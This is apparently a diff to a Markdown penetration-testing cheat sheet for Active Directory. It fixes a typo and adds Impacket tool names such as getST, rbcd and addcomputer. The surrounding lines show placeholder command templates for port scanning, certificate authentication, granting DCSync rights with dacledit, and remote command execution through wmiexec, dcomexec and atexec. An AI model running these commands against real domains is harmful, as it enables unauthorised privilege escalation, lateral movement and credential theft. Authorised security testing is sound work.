@@ -1,5 +1,5 @@
 ## 0
-- `rustsvan -a 'IP' --no-banner --scripts none`
+- `rustscan -a 'IP' --no-banner --scripts none`
 - `nmap -n -Pn -p- -sV 'IP'`
 - `nmap -n -Pn -sV --script vuln 'IP'`
 
@@ -101,6 +101,7 @@ certipy-ad auth -pfx 'FILENAME' -dc-ip 'IP'
 certipy-ad auth -pfx 'FILENAME' -dc-ip 'IP' -u 'USERNAME' -d 'DOMAIN'
 ```
 - impacket-GetNPUsers ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
+- impacket-getST
 - impacket-GetUserSPNs
 - kerbrute ![GitHub Repo stars](https://img.shields.io/github/stars/ropnop/kerbrute?style=social)
 - netexec
@@ -161,6 +162,7 @@ impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -a
 impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
 ```
 - impacket-owneredit
+- impacket-rbcd
 - ldapdomaindump ![GitHub Repo stars](https://img.shields.io/github/stars/dirkjanm/ldapdomaindump?style=social)
 - ldapnomnom ![GitHub Repo stars](https://img.shields.io/github/stars/lkarlslund/ldapnomnom?style=social)
 - LdapRelayScan ![GitHub Repo stars](https://img.shields.io/github/stars/zyn3rgy/LdapRelayScan?style=social)
@@ -237,6 +239,7 @@ impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/
 impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows or ShellBrowserWindow or MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 ```
+- impacket-addcomputer 
 - impacket-Get-GPPPassword
 - impacket-lookupsid
 - impacket-machine_role
